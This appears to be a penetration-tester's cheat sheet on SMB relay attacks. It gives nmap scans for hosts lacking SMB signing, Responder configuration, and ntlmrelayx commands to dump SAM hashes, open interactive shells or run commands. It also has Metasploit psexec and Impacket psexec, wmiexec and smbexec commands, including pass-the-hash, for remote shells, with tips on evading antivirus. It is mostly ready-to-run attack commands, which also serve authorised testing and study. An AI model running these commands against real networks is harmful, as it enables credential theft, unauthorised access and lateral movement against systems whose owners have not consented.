# SMB Relay

Instead of cracking hashes gathered with Responder, relay them to other machines for direct access.

## Requirements

1. SMB signing must be disabled or not enforced on target
2. Relayed user credentials must be admin on the target machine

## Identifying Targets

Scan for SMB signing status:

```bash
# Single host
nmap --script=smb2-security-mode.nse -p445 TARGET_IP

# Entire network
nmap --script=smb2-security-mode.nse -p445 172.16.50.0/24 -Pn
```

Can also use Nessus for this.

## Setting Up the Attack

### 1. Configure Responder

```bash
sudo mousepad /etc/responder/Responder.conf
```

Turn OFF both SMB and HTTP.

### 2. Run ntlmrelayx

Basic relay (dumps SAM hashes):

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

Interactive shell:

```bash
ntlmrelayx.py -tf targets.txt -smb2support -i
```

Execute commands:

```bash
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

## Gaining Shell Access

### Metasploit (Noisy)

```bash
use exploit/windows/smb/psexec
```

Options:
- `SMBDOMAIN` - Domain/server name
- `SMBPASS` - Password or NTLM hash
- `SMBUSER` - Username to authenticate

Target selection: **Target 2** is usually best (options 0-2 work, 3-4 typically don't).

**Note:** Firewall must be disabled on target for this attack.

#### Managing Sessions

```bash
# Background current session
background

# List all sessions
sessions

# Interact with session
sessions -i SESSION_ID
```

This allows running multiple shells/exploits simultaneously (basic C2 functionality).

### Impacket Tools (Quieter)

#### psexec.py

```bash
psexec.py domain/username:'password'@TARGET_IP

# With hash
psexec.py domain/username@TARGET_IP -hashes LMHASH:NTHASH
```

#### Alternatives

If psexec.py fails or AV blocks it:

```bash
wmiexec.py domain/username:'password'@TARGET_IP
smbexec.py domain/username:'password'@TARGET_IP
```

Choice depends on target machine configuration.
